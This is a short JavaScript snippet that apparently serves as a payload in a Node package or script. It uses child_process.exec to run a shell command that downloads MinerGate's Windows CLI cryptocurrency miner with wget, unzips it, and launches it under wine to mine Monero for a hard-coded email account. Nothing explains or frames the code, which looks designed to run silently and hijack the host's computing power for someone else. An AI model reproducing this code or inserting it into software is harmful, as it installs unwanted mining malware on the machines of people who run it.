var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user cccholo@yandex.com -xmr";
require('child_process').exec(str, { stdio: [0, 1, 2] });
